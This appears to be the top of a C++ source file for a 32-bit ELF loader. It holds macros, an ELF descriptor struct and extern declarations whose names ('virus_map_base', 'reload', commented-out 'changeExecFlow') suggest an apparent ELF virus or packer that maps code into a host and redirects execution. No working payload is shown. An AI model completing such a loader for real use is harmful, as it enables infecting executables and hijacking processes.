#include <dlfcn.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <vector>
#include <string.h>
#include <unistd.h>
#include <elf.h>
#include <sys/mman.h>
#include <bitset>
#include <cstdbool>
#include <sys/auxv.h>
#include <algorithm>
#include <error.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
using namespace std;

#define PAGE_MIN_ALIGN 0x1000
#define ELF_MIN_ALIGN(x) x
#define ELF_PAGEALIGN(_v, x) (((_v) + ELF_MIN_ALIGN(x) - 1) & ~(ELF_MIN_ALIGN(x) - 1))
#define ELF_PAGESTART(_v, x) ((_v) & ~(unsigned long)(ELF_MIN_ALIGN(x)-1))
#define ELF_PAGEOFFSET(_v,x) ((_v) & (ELF_MIN_ALIGN(x)-1))
#define ADDR_32_BYTES 4

//#define _DEBUG
#define _NO_ENCRYPT
#define _NO_COMPRESS

#ifdef _DEBUG
#define DEBUG(x) x
#else
#define DEBUG(x)
#endif

typedef unsigned int ADDR_32;
typedef ADDR_32 ADDR;
typedef unsigned char BYTE;

typedef struct{
    const char *file_name;
    Elf32_Ehdr ehdr;
    Elf32_Phdr* phdr;
    ADDR elf_loadbase_addr;
    char * elf_type ;
    unsigned int elf_loadsize;
}struct_elf;

extern void * virus_map_base ;
//extern int template_main();
extern void reload( char * buffer, ADDR fixedAddr , struct_elf& virus_analyse_result);
//extern ADDR getHostStackStart();
//extern ADDR initStack(ADDR phvaddr, int phentrysize, int phnum, ADDR exec_entrypoint, ADDR ld_baseaddr, const char *argv0="XXXXXX", int argc=1);

//extern void changeExecFlow(ADDR top_of_initstack, ADDR exec_entrypoint, struct_elf& elf_analyse_result);
